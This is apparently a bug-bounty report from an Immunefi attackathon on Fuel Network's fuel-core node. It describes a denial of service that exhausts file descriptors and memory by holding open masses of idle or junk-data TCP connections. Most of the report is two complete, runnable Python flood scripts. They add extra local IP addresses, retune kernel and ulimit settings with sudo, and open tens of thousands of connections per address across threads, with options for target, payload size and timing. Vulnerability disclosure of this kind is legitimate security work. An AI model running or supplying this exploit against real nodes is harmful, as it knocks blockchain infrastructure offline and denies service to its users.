# Attackathon \_ Fuel Network 32978 - \[Blockchain\_DLT - Insight] isolating the node from the networkcau

## isolating the node from the network/causing OOM by resource exhaust

Submitted on Mon Jul 08 2024 18:17:42 GMT-0400 (Atlantic Standard Time) by @fnmain for [Attackathon | Fuel Network](https://immunefi.com/bounty/fuel-network-attackathon/)

Report ID: #32978

Report type: Blockchain/DLT

Report severity: Insight

Target: <https://github.com/FuelLabs/fuel-core/tree/v0.31.0>

Impacts:

* RPC API crash affecting projects with greater than or equal to 25% of the market capitalization on top of the respective layer

### Description

### Brief/Intro

establishing connexions without exchanging data with http server is opening an FD and maintain it open even adding limitation to connexion params can result in node isolation OR OOM due the resource exhausting that occur among bypassing all checks/limitations

### Vulnerability Details

* by creating a connexion to the node without exchanging any data the node remain the connexion open without killing it which is using some resources and the node do not interrupt the connexion based on limtations set as max connexions and connexion timeout so by creating huge amount of connexions to the target node the attacker can isolate it from the network where it establish any other connexion by fd limit , or if the limit was to big the node will crash due OOM since the resource exhausting
* secondly by doing the same steps but sending 1KB to the target node of trash data with spamming cnxs it can result OOM ( and technically for default node body msg is 1MB the rate limit setting for cloudflare is 999 cnxs/per host so every ip can exhaust 1GB of storage which means it can also be applicable also for nodes behind webFirewal such as cloudflare )

### Impact Details

isolation the node from the network, OOM crash, DoS

### References

Add any relevant links to documentation or code

### Proof of concept

## Proof of Concept

* note command used to start the node :

```
$ ./fuel-core run --max-connections-per-peer 10 --connection-idle-timeout 10 --max-peers-connected 10 --ip 0.0.0.0
```

### exploit\_script (tested on v0.31.0 local node) result in OOM:

```
def setup_interface(interface=["wlan0", "eth0"], COUNT=20):
    _interface = ""
    psutil=__import__("psutil")
    if type(interface) != str:
        addrs = psutil.net_if_addrs()
        _interface = "wlan0" if "wlan0" in addrs else "eth0" if "eth0" in addrs else exec('print("[err] cannot set the interface automaticly please use -I <interface>");__import__("sys").exit(0)')
    else:
        _interface = interface
    print(f"[INIT] interface:{_interface} selected")
    interfaces = psutil.net_if_addrs()
    base_addr,netmask = "",""
    for address in interfaces[_interface]:
        if address.family == __import__("socket").AF_INET:
            (base_addr, netmask)=(address.address, address.netmask)
    prefix = str(__import__("ipaddress").ip_network(f"{base_addr}/{netmask}", strict=False)).split("/")[-1]
    subprocess = __import__("subprocess")
    nx_ip = f"{base_addr.split('.')[0]}.{base_addr.split('.')[1]}.{base_addr.split('.')[2]}.REPME"
    cmd_base = f"ip addr add {nx_ip}/{prefix} dev {_interface}"
    start_base = int(base_addr.split(".")[-1])
    its_done=False
    #COUNT=20 # 20 default ( max cnx = 0xFFFF*20)
    IPN = start_base
    lips = []
    while not its_done:
        try:
            r=subprocess.run(cmd_base.replace("REPME", str(IPN)), shell=True, check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if r.returncode == 0:
                COUNT=COUNT-1
                IPN=IPN+1
                lips.append(nx_ip.replace("REPME", str(IPN)))
            else:
                IPN=IPN+1
            if COUNT == 0: its_done = True
        except subprocess.CalledProcessError as e:
            print(e)
            __import__("sys").exit(-1)
    return lips



def _init(I, C):
    print("[INIT] , adjusting fd limit to 1026000")
    __import__("os").system("ulimit -n 1026000")
    run_command = __import__("os").system
    print("[INIT] preapring kernel params to support ~0xffff cnx per ip")
    run_command("sudo sysctl -w net.ipv4.ip_local_port_range='1024 65535'")
    run_command("sudo sysctl -w net.ipv4.tcp_tw_reuse=1")
    run_command("sudo sysctl -w net.ipv4.tcp_fin_timeout=30")
    resource = __import__("resource")
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    resource.setrlimit(resource.RLIMIT_NOFILE, (1026000, hard))
    print("[INIT] registring more ips for used interface [default:20]")
    ips = setup_interface(I, C)
    #print(f"[INFO] ips:{ips}")

    print("[INFO] initialisation done , starting the execution of all threads")
    return ips

new_cnx = __import__("threading").Thread
(H,P) = ("192.168.11.106", 4000)

def openFDS(IP):
    counter = 0
    fails = 0
    cnxs = []
    for i in range(0xFFFF - 2000):
        try:
            cnxs.append(__import__("socket").socket())
            cnxs[counter].bind((IP, 0))
            cnxs[counter].connect((H,P))
            cnxs[counter].send(b"A"*(1024))
            #print(f"IP_BUSD={IP},OPEN_CNX={counter},FAILS={fails}\t\t", end="\r")
            counter=counter+1
        except:
            fails = fails+1
            pass
    print()

def argv_parser():
    host, port, interface, threads, count = None, None, None, 1, 20

    args = __import__("sys").argv
    for i in range(1,len(args)):
        if args[i] == "-i":
            interface = args[i+1]
        elif args[i] == "-h":
            host = args[i+1]
        elif args[i] == "-p":
            port = args[i+1]
        elif args[i] == "-t":
            threads = args[i+1]
        elif args[i] == "-c":
            count = args[i+1]
        else:
            pass
            #print(f"[WARN] {args[i]} unkown param")
    return host,int(port),interface,int(threads),int(count)

HH,PP,II,TT,CC = argv_parser()
H = HH if HH is not None else H
P = PP if PP is not None else P
ips = _init(II, CC) # autoselect if None
tp = []

print(f"opts:h,p,i,t,c={HH,PP,II,TT,CC}")

#for i in range(TT):
i = 0
while i != TT:
    for _ip in ips:
        tp.append(new_cnx(target=openFDS, args=(_ip,)))
        tp[i].start()
        i=i+1

for i in range((TT*len(ips))):
    tp[i].join()

```

executing the exploit :

```
python3 exploit.py -h 192.168.11.106 -p 4000 -i eth0 -c 8 -t 4
```

***

there is a more customized exploit with doc that can be used either for fd resource exhaust or OOM :

```
def setup_interface(interface=["wlan0", "eth0"], COUNT=20):
    _interface = ""
    psutil=__import__("psutil")
    if type(interface) != str:
        addrs = psutil.net_if_addrs()
        _interface = "wlan0" if "wlan0" in addrs else "eth0" if "eth0" in addrs else exec('print("[err] cannot set the interface automaticly please use -I <interface>");__import__("sys").exit(0)')
    else:
        _interface = interface
    print(f"[INIT] interface:{_interface} selected")
    interfaces = psutil.net_if_addrs()
    base_addr,netmask = "",""
    for address in interfaces[_interface]:
        if address.family == __import__("socket").AF_INET:
            (base_addr, netmask)=(address.address, address.netmask)
    prefix = str(__import__("ipaddress").ip_network(f"{base_addr}/{netmask}", strict=False)).split("/")[-1]
    subprocess = __import__("subprocess")
    nx_ip = f"{base_addr.split('.')[0]}.{base_addr.split('.')[1]}.{base_addr.split('.')[2]}.REPME"
    cmd_base = f"ip addr add {nx_ip}/{prefix} dev {_interface}"
    start_base = int(base_addr.split(".")[-1])-1
    its_done=False
    IPN = start_base
    lips = []
    while not its_done:
        try:
            r=subprocess.run(cmd_base.replace("REPME", str(IPN)), shell=True, check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if r.returncode == 0:
                COUNT=COUNT-1
                IPN=IPN+1
                lips.append(nx_ip.replace("REPME", str(IPN)))
            else:
                IPN=IPN+1
            if COUNT == 0: its_done = True
        except subprocess.CalledProcessError as e:
            print(e)
            __import__("sys").exit(-1)
    return lips



def _init(I, C):
    print("[INIT] , adjusting fd limit to 1026000")
    __import__("os").system("ulimit -n 1026000")
    run_command = __import__("os").system
    print("[INIT] preapring kernel params to support ~0xffff cnx per ip")
    run_command("sudo sysctl -w net.ipv4.ip_local_port_range='1024 65535'")
    run_command("sudo sysctl -w net.ipv4.tcp_tw_reuse=1")
    run_command("sudo sysctl -w net.ipv4.tcp_fin_timeout=30")
    resource = __import__("resource")
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    resource.setrlimit(resource.RLIMIT_NOFILE, (1026000, hard))
    print("[INIT] registring more ips for used interface [default:20]")
    ips = setup_interface(I, C)
    #print(f"[INFO] ips:{ips}")
    print("[INFO] initialisation done , starting the execution of all threads")
    return ips

new_cnx = __import__("threading").Thread
(H,P) = ("192.168.11.106", 4000)

def openFDS(IP, with_data=0, R=(0xFFFF-2000), TS=0):
    if R == 0: R=(0xFFFF-2000)
    counter = 0
    fails = 0
    cnxs = []
    for i in range(R):
        try:
            cnxs.append(__import__("socket").socket())
            cnxs[counter].bind((IP, 0))
            cnxs[counter].connect((H,P))
            if with_data != 0:
                cnxs[counter].send(b"A"*with_data)
            counter=counter+1
        except:
            fails = fails+1
            pass
    print(f"[INFO][SEP_THR] sleeping for {TS} with {len(cnxs)} open cnxs")
    __import__("time").sleep(TS)

def _help():
    print("""-he\thelp msg
-i\tinterface to use
-h\ttarget ip address
-p\ttarget port
-t\tthreads to be generated
-c\tcount of addresses to be used
-d\tamount of data to send for each cnx (defualt:0 , no data)
-n\tconnexion amount needed
-s\tsleeping time after finishing the cnx setup""")
    __import__("sys").exit(0)

def argv_parser():
    connexions, host, port, interface, threads, count, data_amount,stime = 0, None, 0, None, 1, 1, 0, 0

    args = __import__("sys").argv
    for i in range(1,len(args)):
        if (len(args) == 1) or args[i] == "-he":
            _help()
        elif args[i] == "-i":
            interface = args[i+1]
        elif args[i] == "-h":
            host = args[i+1]
        elif args[i] == "-p":
            port = args[i+1]
        elif args[i] == "-t":
            threads = args[i+1]
        elif args[i] == "-c":
            count = args[i+1]
        elif args[i] == "-d":
            data_amount = args[i+1]
        elif args[i] == "-n":
            connexions = args[i+1]
        elif args[i] == "-s":
            stime = args[i+1]
        else:
            pass
    return host,int(port),interface,int(threads),int(count),int(data_amount),int(connexions),int(stime)

HH,PP,II,TT,CC,DM,CN,TS = argv_parser()
H = HH if HH is not None else H
P = PP if PP is not None else P
tp = []

print(f"[DBG] opts:h,p,i,t,c={HH,PP,II,TT,CC}")

ips = _init(II, CC) # autoselect if none

print(f"[INFO] threads={TT} ip_count={CC} ips={len(ips)} total_threads={TT**len(ips)}")
print(ips)

i = 0
while i != TT:
    for _ip in ips:
        tp.append(new_cnx(target=openFDS, args=(_ip,DM, CN, TS)))
        tp[i].start()
        i=i+1

for i in range((TT*len(ips))):
    tp[i].join()
```
